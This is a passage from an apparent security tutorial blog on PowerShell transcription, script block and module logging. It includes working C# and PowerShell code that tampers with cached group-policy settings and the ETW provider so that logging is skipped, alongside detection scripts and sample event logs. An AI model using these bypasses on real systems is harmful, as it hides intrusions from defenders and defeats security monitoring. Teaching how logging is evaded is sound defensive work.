enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span>.OutputDirectory) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Log directory: <span class=\"variable\">$</span>(<span class=\"variable\">$transcriptionSettings</span>.OutputDirectory)&quot;</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Log directory: Default (User&#x27;s Documents folder, typically <span class=\"variable\">$HOME</span>\\Documents)&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span>.EnableInvocationHeader <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Invocation headers are included in logs.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Transcription logging is not enabled via Group Policy.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs see what this will do</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def26.png\" alt=\"\"></figure>\n\n\n<p>you can‚Äôt get the script content here you just get the command and the ouput like a session</p>\n<blockquote>\n<p>what is the invokation headers , <a href=\"https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/\">Patrick</a> explain them here with those screenshots :</p>\n<p>Transcription Logging without invokation headers activated:</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def27.png\" alt=\"\"></figure>\nThe second one shows logging with invokation headers activated:\n<figure><img src=\"/images/site/posts/DefenseEvasion/def28.png\" alt=\"\"></figure><p>{: .prompt-info }</p>\n</blockquote>\n<h4 id=\"PowerShell-Transcription-Bypass\"><a href=\"#PowerShell-Transcription-Bypass\" class=\"headerlink\" title=\"PowerShell Transcription Bypass\"></a>PowerShell Transcription Bypass</h4><p>This one Doesn‚Äôt have many resources but there is a one <a href=\"https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass\">here</a> by <a href=\"https://avantguard.io/en/blog/author/jann-lemm\">jann lemm</a> , The idea behinde this bypass is the Transcription only check one thing to determine if it‚Äôs enabled and it‚Äôs the PowerShell registry (<strong>HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription)</strong> or Group Policy to check if <strong>EnableTranscripting is 1</strong></p>\n<p>To change the key we need an administrative privileges so what should we do ?</p>\n<p>jann lemm said , If the registry key EnableTranscripting is set to 0 while in an active PowerShell session, the transcript is continued and no bypass is possible, even though the cached value is set to 0. But if these changes to the field are made before a custom PowerShell runspace is opened, the runspace will use the cached (and modified) values, effectively allowing a bypass of the three logging mechanisms by an unprivileged user.</p>\n<p>For the first time i don‚Äôt understand it , So i will try to explain this more for you in Practical way like the above</p>\n<p>So Let‚Äôs see how the jann lemm bypass work and how the regular exe work to work Hello World</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Hello_World.cs </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Create a default runspace</span></span><br><span class=\"line\">        <span class=\"keyword\">using</span> (Runspace runspace = RunspaceFactory.CreateRunspace())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            runspace.Open();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Create a pipeline</span></span><br><span class=\"line\">            <span class=\"keyword\">using</span> (Pipeline pipeline = runspace.CreatePipeline())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Add the command to print &quot;Hello World&quot;</span></span><br><span class=\"line\">                pipeline.Commands.AddScript(<span class=\"string\">&quot;Write-Output &#x27;Hello World&#x27;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Execute the pipeline and get results</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> results = pipeline.Invoke();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Display results</span></span><br><span class=\"line\">                <span class=\"keyword\">foreach</span> (PSObject result <span class=\"keyword\">in</span> results)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    Console.WriteLine(result.ToString());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            runspace.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            rs.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Reflection;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Concurrent;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.ObjectModel;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">CustomRunspace</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title\">CustomRunspace</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Transcription Logging Bypass</span></span><br><span class=\"line\">            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;</span><br><span class=\"line\">            ConcurrentDictionary&lt;<span class=\"built_in\">string</span>, Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;&gt; <span class=\"keyword\">value</span> = (ConcurrentDictionary&lt;<span class=\"built_in\">string</span>, Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;&gt;)rs.GetType().Assembly.GetType(<span class=\"string\">&quot;System.Management.Automation.Utils&quot;</span>).GetField(<span class=\"string\">&quot;cachedGroupPolicySettings&quot;</span>, bf).GetValue(<span class=\"literal\">null</span>);</span><br><span class=\"line\">            Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt; dic = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;();</span><br><span class=\"line\">            dic.Add(<span class=\"string\">&quot;EnableTranscripting&quot;</span>, <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">value</span>.GetOrAdd(<span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription&quot;</span>, dic);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Open Runspace</span></span><br><span class=\"line\">            rs.Open();</span><br><span class=\"line\"></span><br><span class=\"line\">            PowerShell ps = PowerShell.Create();</span><br><span class=\"line\">            ps.Runspace = rs;</span><br><span class=\"line\">            ps.AddCommand(<span class=\"string\">&quot;Write-Output&quot;</span>).AddArgument(<span class=\"string\">&quot;Hello World&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            Collection&lt;PSObject&gt; results = ps.Invoke();</span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> result <span class=\"keyword\">in</span> results)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Console.WriteLine(result);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            rs.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>Runspace (short for ‚Äúruntime space‚Äù) is an <strong>isolated execution</strong> environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. <strong>It includes session state</strong> (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input&#x2F;output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution</li>\n<li>you can compile the cs files with this command :</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\csc.exe /reference:<span class=\"string\">&quot;C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll&quot;</span> /out:Transcription_Bypass.exe CustomRunspace.cs</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<p>Let‚Äôs see what we can do</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def29.png\" alt=\"\"></figure>\n\n<p>So , When we run the hello_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">53504</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">111</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">10</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-24T01:33:13.9730709Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">57</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;3aa23c01-fc70-0000-906c-a23a70fcdb01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;7140&quot;</span> ThreadID=<span class=\"string\">&quot;3408&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-INN3ESD</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-2346707970-763624724-545999952-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;param1&quot;</span>&gt;<span class=\"number\">7140</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;param2&quot;</span>&gt;DefaultAppDomain&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs run the Bypass script with the same Hello_World function</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def30.png\" alt=\"\"></figure>\n\n<p>So, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.</p>\n<h3 id=\"Script-Block-Logging\"><a href=\"#Script-Block-Logging\" class=\"headerlink\" title=\"Script Block Logging\"></a>Script Block Logging</h3><p>Records the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Powershell script block logging</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def31.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Script block logging are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$scriptBlockLogging</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$scriptBlockLogging</span> <span class=\"operator\">-and</span> <span class=\"variable\">$scriptBlockLogging</span>.EnableScriptBlockLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script Block Logging is enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$scriptBlockLogging</span>.EnableScriptBlockInvocationLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script block invocation logging is also enabled.&quot;</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script block invocation logging is not enabled.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script Block Logging is not enabled.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>let‚Äôs start and after that start enum the event‚Äôs with</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-LogName</span> <span class=\"string\">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class=\"literal\">-MaxEvents</span> <span class=\"number\">100</span> | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Id <span class=\"operator\">-eq</span> <span class=\"number\">4104</span> &#125; | <span class=\"built_in\">Select-Object</span> TimeCreated, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;ScriptBlock&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">2</span>].Value&#125;&#125; | <span class=\"built_in\">Format-List</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def32.png\" alt=\"\"></figure>\n\n<blockquote>\n<ul>\n<li><p>The Script block get the script content not only the input and the output in the prompt</p>\n</li>\n<li><p><a href=\"https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell\">PowerShell 5.0 auto logging</a> : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as <em><strong>suspicious</strong></em> by AMSI (Antimalware Scan Interface), will automatically log a Script block&#x2F;4104 event with a level of <em><strong>Warning</strong></em>. <a href=\"https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html\">If script block logging is explicitly disabled, these events will not be logged.</a><br>{: .prompt-info }</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"ScriptBlock-Bypass\"><a href=\"#ScriptBlock-Bypass\" class=\"headerlink\" title=\"ScriptBlock Bypass\"></a>ScriptBlock Bypass</h4><p>Like the previous bypasses , The user can change his powershell session evniroments and the cached setting so <a href=\"https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html\">cobbr</a> notice that and made this <a href=\"https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407\">script</a> for us to disable the scriptblock logging</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$GroupPolicyField</span> = [<span class=\"type\">ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Utils&#x27;</span>).<span class=\"string\">&quot;GetFie`ld&quot;</span>(<span class=\"string\">&#x27;cachedGroupPolicySettings&#x27;</span>, <span class=\"string\">&#x27;N&#x27;</span>+<span class=\"string\">&#x27;onPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">If</span> (<span class=\"variable\">$GroupPolicyField</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$GroupPolicyCache</span> = <span class=\"variable\">$GroupPolicyField</span>.GetValue(<span class=\"variable\">$null</span>)</span><br><span class=\"line\">    <span class=\"keyword\">If</span> (<span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>][<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>][<span class=\"string\">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$val</span> = [<span class=\"type\">System.Collections.Generic.Dictionary</span>[<span class=\"built_in\">string</span>,<span class=\"type\">System.Object</span>]]::new()</span><br><span class=\"line\">    <span class=\"variable\">$val</span>.Add(<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"variable\">$val</span>.Add(<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockInvocationLogging&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>] = <span class=\"variable\">$val</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Then test it with the count of the logs</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-FilterHashtable</span> <span class=\"selector-tag\">@</span>&#123;ProviderName=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span>; Id=<span class=\"number\">4104</span>&#125; | <span class=\"built_in\">Measure</span> | % Count</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def33.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>Our bypass script will still being logged cuz of <a href=\"https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101\">Event Tracing for Windows</a> you can use this <a href=\"https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32\">script here</a> to disable it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Reflection.Assembly</span>]::LoadWithPartialName(<span class=\"string\">&#x27;System.Core&#x27;</span>).GetType(<span class=\"string\">&#x27;System.Diagnostics.Eventing.EventProvider&#x27;</span>).GetField(<span class=\"string\">&#x27;m_enabled&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Instance&#x27;</span>).SetValue([<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Tracing.PSEtwLogProvider&#x27;</span>).GetField(<span class=\"string\">&#x27;etwProvider&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class=\"variable\">$null</span>),<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"Module-Logging\"><a href=\"#Module-Logging\" class=\"headerlink\" title=\"Module Logging\"></a>Module Logging</h3><p>Records pipeline execution details for <span style=\"color:yellow\">cmdlets from specified modules</span>, including variable initialization and command invocations.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Module logging</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def34.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Module logging are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$moduleLogging</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$moduleLogging</span> <span class=\"operator\">-and</span> <span class=\"variable\">$moduleLogging</span>.EnableModuleLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Module Logging is enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"variable\">$moduleNames</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$moduleNames</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Modules being logged:&quot;</span></span><br><span class=\"line\">        <span class=\"variable\">$moduleNames</span>.PSObject.Properties | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Name <span class=\"operator\">-ne</span> <span class=\"string\">&#x27;PSPath&#x27;</span> <span class=\"operator\">-and</span> <span class=\"variable\">$_</span>.Name <span class=\"operator\">-ne</span> <span class=\"string\">&#x27;PSParentPath&#x27;</span> &#125; | <span class=\"built_in\">ForEach-Object</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot; - <span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Name) = <span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Value)&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;No specific modules are configured for logging.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Module Logging is not enabled.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>let‚Äôs start and after that start enum the event‚Äôs with</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-LogName</span> <span class=\"string\">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class=\"literal\">-MaxEvents</span> <span class=\"number\">100</span> | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Id <span class=\"operator\">-eq</span> <span class=\"number\">4103</span> &#125; | <span class=\"built_in\">Select-Object</span> TimeCreated, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;Command&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">1</span>].Value&#125;&#125;, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;Module&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">0</span>].Value&#125;&#125; | <span class=\"built_in\">Format-List</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def35.png\" alt=\"\"></figure>\n\n\n\n<h4 id=\"Module-Logging-Bypass\"><a href=\"#Module-Logging-Bypass\" class=\"headerlink\" title=\"Module Logging Bypass\"></a>Module Logging Bypass</h4><p>Let‚Äôs start with a simple event like print a string with write-host</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def36.png\" alt=\"\"></figure>\n\n\n<p>This simple command trigger 4 events let‚Äôs discribe them</p>\n<ul>\n<li>PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8187082Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">285</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0000-6a3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span 